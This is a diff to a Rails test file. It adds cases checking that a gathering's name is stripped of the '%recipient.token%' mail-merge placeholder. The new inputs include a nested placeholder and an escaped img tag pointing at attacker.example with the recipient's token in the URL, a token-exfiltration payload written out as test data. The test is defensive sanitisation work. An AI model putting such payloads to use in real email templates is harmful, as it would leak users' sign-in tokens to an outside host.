@@ -177,6 +177,12 @@ class GatheringsTest < ActiveSupport::TestCase
     )
     @gathering.update!(name: 'Gathering %recipient.token%')
     assert_equal 'Gathering', @gathering.name
+    @gathering.update!(name: 'Gathering %recipient.tok%recipient.token%en%')
+    assert_equal 'Gathering', @gathering.name
+    @gathering.update!(name: 'Gathering &lt;img src="https://attacker.example/%recipient.token%"&gt;')
+    assert_equal 'Gathering', @gathering.name
+    refute_match(/<img/i, @gathering.name)
+    refute_includes @gathering.name, '%recipient'
     sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%">Sign in</a>)
     html = EmailHelper.html(content: @gathering.welcome_email) do |content|
       EmailHelper.replace_youtube_oembeds(content)
